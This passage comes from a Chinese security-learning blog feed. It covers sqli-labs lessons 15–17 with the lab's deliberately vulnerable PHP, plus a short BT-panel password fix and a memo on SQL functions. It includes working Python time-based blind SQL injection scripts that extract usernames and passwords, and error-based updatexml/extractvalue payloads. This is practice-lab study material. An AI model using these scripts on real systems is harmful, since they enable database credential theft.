class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">':'</span>,<span class="string">';'</span>,<span class="string">'&lt;'</span>,<span class="string">'='</span>,<span class="string">'&gt;'</span>,<span class="string">'?'</span>,<span class="string">'@'</span>,<span class="string">'['</span>,<span class="string">'\\'</span>,<span class="string">']'</span>,<span class="string">'^'</span>,<span class="string">'`'</span>,<span class="string">'&#123;'</span>,<span class="string">'|'</span>,<span class="string">'&#125;'</span>,<span class="string">'~'</span>]</span><br><span class="line">    <span class="keyword">for</span> queryChar <span class="keyword">in</span> order:</span><br><span class="line">        queryASCII = ord(queryChar)</span><br><span class="line">        <span class="keyword">if</span> exce(str(indexOfResult),str(indexOfChar + <span class="number">1</span>), str(queryASCII)):</span><br><span class="line">            <span class="keyword">return</span> chr(queryASCII)</span><br><span class="line">    <span class="keyword">return</span> chr(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>): <span class="comment"># 需要遍历的查询结果的数量</span></span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>): <span class="comment"># 结果的长度</span></span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            temp = doSearch(i, j) <span class="comment"># 从255开始查询</span></span><br><span class="line">            <span class="keyword">if</span> ord(temp) == <span class="number">1</span>: <span class="comment"># 当为1的时候说明已经查询结束</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sys.stdout.write(temp)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">1</span>: <span class="comment"># 当结果集的所有行都被遍历后退出</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sys.stdout.write(<span class="string">"\r\n"</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">search()</span><br><span class="line">代码来源：https://www.jianshu.com/p/e5a42373ed12</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in\n\n " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row['username'];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a><strong>Less-</strong>16</h1><p>把Less-15脚本SQL语句中前面的” ‘ “换成” “) “即可</p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a><strong>Less-</strong>17</h1><p>php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))<span class="comment">//检查是否为空</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line">$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);<span class="comment">//截取前面15个字符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())<span class="comment">//此方法当magic_quotes_gpc开启时所有的 ' (单引号)、" (双引号)、\（反斜杠）和 NULL字符都会被一个反斜杠自动转义。 但在php5.4起已经被放弃，始终返回false</span></span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);<span class="comment">//去除反斜杠</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))<span class="comment">//纯数字检测</span></span><br><span class="line">&#123;</span><br><span class="line">$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;<span class="comment">//mysql_real_escape_string对字符串中的特殊字符进行转义，会被进行转义的字符包括： NULL（ASCII 0），\n，\r，\，'，" 和 Control-Z. </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);<span class="comment">//获取变量的整数值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">'uname'</span>]);  <span class="comment">//uname被check_input了，详见上面的代码</span></span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'User Name:'</span>.$uname.<span class="string">"\n"</span>);</span><br><span class="line">fwrite($fp,<span class="string">'New Password:'</span>.$passwd.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">$row1 = $row[<span class="string">'username'</span>];  </span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row1;</span></span><br><span class="line">$update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line">mysql_query($update);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (mysql_error())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You password has been successfully updated " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag1.jpg"   /&gt;'</span>;</span><br><span class="line"><span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="4.5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Bug off you Silly Dumb hacker";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg"   /&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*."</span></span><br><span class="line">url = <span class="string">"http://192.168.184.1:801/sqli/Less-17/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        <span class="comment">#1' where username='admin' and if(mid((select database()),1,1)= 's',sleep(3),1)#</span></span><br><span class="line">        <span class="comment">#1' where username='admin' and if(mid((select  database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span></span><br><span class="line">        <span class="comment">#1' where username='admin' and if(mid((select group_concat(table_name,'') from information_schema.tables where table_schema=database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span></span><br><span class="line">        <span class="comment">#1' where username='admin' and if(mid((select group_concat(column_name,'') from information_schema.columns where table_name='users' and table_schema=database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span></span><br><span class="line">        <span class="comment">#1' where username='admin' and if(substr((select * from (select GROUP_CONCAT(BINARY(username),',',BINARY(password)) from users) as temp),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span></span><br><span class="line">        flag = <span class="string">"1' where username='admin' and if(substr((select * from (select GROUP_CONCAT(BINARY(username),',',BINARY(password)) from users) as temp),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#"</span>.format(i,j)</span><br><span class="line">        data = &#123;<span class="string">"uname"</span>:<span class="string">"admin"</span>,<span class="string">"passwd"</span>:flag,<span class="string">"submit"</span>:<span class="string">"submit"</span>&#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#print("&#123;&#125;".format(r.status_code))</span></span><br><span class="line">        <span class="keyword">if</span> r.elapsed.total_seconds()&gt;<span class="number">2</span>:</span><br><span class="line">            print(j,end = <span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>加上<code>where username=&#39;admin&#39;</code>是为了减少爆破时间，因为在改<code>password</code>的时候就只会改<code>admin</code>的<code>password</code>了，如果不加上亦可，不加上的话会将所有的<code>password</code>都改为<code>1</code>，但也达到了目的，在最后爆破字段的时候采用了一个虚表<code>temp</code>，因为<code>update</code>操作和<code>select</code>操作都作用于一张表，且会报错：<code>Table &#39;test&#39; is specified twice, both as a target for &#39;UPDATE&#39; and as a separate source for data</code>所以采用虚表进行盲注，且使用了<code>BINARY</code>函数来区分表中内容的大小写</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> SQL </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次有惊无险！！！</title>
      <link href="/2020/01/21/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%9C%89%E6%83%8A%E6%97%A0%E9%99%A9%EF%BC%81%EF%BC%81%EF%BC%81/"/>
      <url>/2020/01/21/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%9C%89%E6%83%8A%E6%97%A0%E9%99%A9%EF%BC%81%EF%BC%81%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>莫名其妙的phpmyadmin就进不去了，一直密码错误，在bt里面改密码也进不去，搞的后来差一点删除数据库</p><p>解决方法：</p><p>修改数据库密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /www/server/panel &amp;&amp; python tools.pyc root xxx</span><br></pre></td></tr></table></figure><p>修改bt面板的密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /www/server/panel &amp;&amp; python tools.pyc panel xxx</span><br></pre></td></tr></table></figure><p>xxx处写修改你的数据库密码或bt密码</p><p>注意，修改完密码后访问wp博客会显示数据库连接错误，这时在wp-config.php中修改你的MySQL数据库密码就行啦！</p><p>附上参考原文<a href="https://www.xqblog.com/12973.html" target="_blank" rel="noopener">链接</a></p><p>感谢！</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%9C%89%E6%83%8A%E6%97%A0%E9%99%A9%EF%BC%81%EF%BC%81%EF%BC%81/55667523_p0_master1200.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SQL中的一些函数（备忘）</title>
      <link href="/2020/01/17/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/"/>
      <url>/2020/01/17/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a><strong>SQL Server</strong></h1><h2 id="STUFF-character-expression-start-length-character-expression"><a href="#STUFF-character-expression-start-length-character-expression" class="headerlink" title="STUFF ( character_expression , start , length ,character_expression )"></a><strong>STUFF ( character_expression , start , length ,character_expression )</strong></h2><p>character_expression：一个字符数据表达式，可以是常量，变量，也可以是字符列或二级制数据列</p><p>start：一个重整数值，指定要删除和插入的开始位置，如果start或length为负，则返回空字符串。如果start比第一个character_expression长，则返回空字符串。start可以是big int型。</p><p>length：一个整数，指定要删除的字符串。如果length比第一个character_expression长，则最多删除到最后一个character_expression中的最后一个字符。length可以是big int类型。</p><p>返回类型：如果character_expression是受支持的字符数据类型，则返回字符数据。如果character_expression是一个受支持的binary数据类型，则返回二进制数据。</p><p>例如：</p><p>以下示例在第一个字符串 abcdef 中删除从第 2 个位置（字符 b）开始的三个字符，然后在删除的起始位置插入第二个字符串，从而创建并返回一个字符串。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">STUFF</span>(<span class="string">'abcdef'</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">'ijklmn'</span>);</span><br><span class="line">结果：aijklmnef</span><br></pre></td></tr></table></figure><h2 id="FOR-XML-PATH-‘’"><a href="#FOR-XML-PATH-‘’" class="headerlink" title="FOR XML PATH(‘’)"></a><strong>FOR XML PATH(‘’)</strong></h2><p>通常与stuff函数结合起来使用， 将查询结果集以<a href="https://baike.baidu.com/item/%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/2885849?fromtitle=xml&fromid=86251&fr=aladdin" target="_blank" rel="noopener">XML</a>形式展现</p><p>现有表</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-107.png" alt=""></p><p>执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">stuff</span>((<span class="keyword">select</span> <span class="string">','</span>+test_name+test_pass <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">for</span> <span class="keyword">xml</span> <span class="keyword">path</span>(<span class="string">'root'</span>)),<span class="number">1</span>,<span class="number">1</span>,<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-108.png" alt=""></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">stuff</span>((<span class="keyword">select</span> <span class="string">','</span>+test_name+test_pass <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">for</span> <span class="keyword">xml</span> <span class="keyword">path</span>(<span class="string">''</span>)),<span class="number">1</span>,<span class="number">1</span>,<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-109.png" alt=""></p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><strong>MySQL</strong></h1><h2 id="Concat-str1-str2-…"><a href="#Concat-str1-str2-…" class="headerlink" title="Concat( str1,str2,… )"></a><strong>Concat( str1,str2,… )</strong></h2><p>返回结果为连续参数产生的字符串。如果任何一个参数为NULL，则返回值为NULL。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-138.png" alt=""></p><h2 id="Concat-ws-separator-str1-str2-…"><a href="#Concat-ws-separator-str1-str2-…" class="headerlink" title="Concat_ws(separator,str1,str2,…)"></a><strong>Concat_ws(separator,str1,str2,…)</strong></h2><p>concat_ws()代表concat with separator ，是concat的特殊形式。第一个参数是其它参数的分隔符，如果分隔符为NULL，则结果为NULL</p><p>函数返回结果为连接参数产生的字符串</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-139.png" alt=""></p><h2 id="Group-concat"><a href="#Group-concat" class="headerlink" title="Group_concat()"></a>Group_concat()</h2><p>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])</p><p>将同一个分组中的值连接起来，返回一个字符串结果。</p><p>通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200203144159549.png" alt=""></p><h2 id="Updatexml-XML-document-XPath-string-new-value"><a href="#Updatexml-XML-document-XPath-string-new-value" class="headerlink" title="Updatexml (XML_document, XPath_string, new_value)"></a><strong>Updatexml (XML_document, XPath_string, new_value)</strong></h2><ul><li>XML_document：String格式，为XML文档对象的名称</li><li>XPath_string：XPath格式的字符串</li><li>new_value：String格式，替换查找到的符合条件的数据</li></ul><p>SQL注入通常用于显错注入；XPath_string出参数错误报错，得到信息，方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(1,(SELECT database())),1);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-141.png" alt=""></p><h2 id="Extractvalue-XML-document-XPath-string"><a href="#Extractvalue-XML-document-XPath-string" class="headerlink" title="Extractvalue (XML_document, XPath_string)"></a><strong>Extractvalue (XML_document, XPath_string)</strong></h2><ul><li><p>XML_document：String格式，为XML文档对象的名称</p></li><li><p>XPath_string：Xpath格式的字符串</p><p>extractvalue(1,concat(1,database()));</p></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-142.png" alt=""></p><h2 id="Left-ARG-LENGTH-、Right-ARG-LENGTH"><a href="#Left-ARG-LENGTH-、Right-ARG-LENGTH" class="headerlink" title="Left(ARG,LENGTH)、Right(ARG,LENGTH)"></a><strong>Left(ARG,LENGTH)、Right(ARG,LENGTH)</strong></h2><p>此函数返回ARG最左边，右边的LENGTH个字符串，ARG可是char或binary，string</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-143.png" alt=""></p><h2 id="Substr-stirng-strat-length"><a href="#Substr-stirng-strat-length" class="headerlink" title="Substr(stirng,strat,length)"></a><strong>Substr(stirng,strat,length)</strong></h2><ul><li>string：需要截取的字符串</li><li>start：开始截取的位置</li><li>length：需要截取字符串的个数，若无此项，则从截取位置一直截取到最后</li></ul><p>必要的时候可以不用逗号用<code>from</code>和<code>for</code>代替，<code>substr(string from start for length)</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-152.png" alt=""></p><h2 id="Ascii-str"><a href="#Ascii-str" class="headerlink" title="Ascii(str)"></a><strong>Ascii(str)</strong></h2><p>返回字符串str的最左字符的数值。返回0，如果str为空字符串。返回NULL，如果str为NULL。 ASCII()返回数值是从0到255。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-166.png" alt=""></p><h2 id="Pow-x-y"><a href="#Pow-x-y" class="headerlink" title="Pow(x,y)"></a>Pow(x,y)</h2><p>pow(x,y)表示计算x的y次方，当计算值过大时，会发生DOUBLE溢出，数据库报错</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200203151717577.png" alt=""></p><h2 id="MID-column-name-start-length"><a href="#MID-column-name-start-length" class="headerlink" 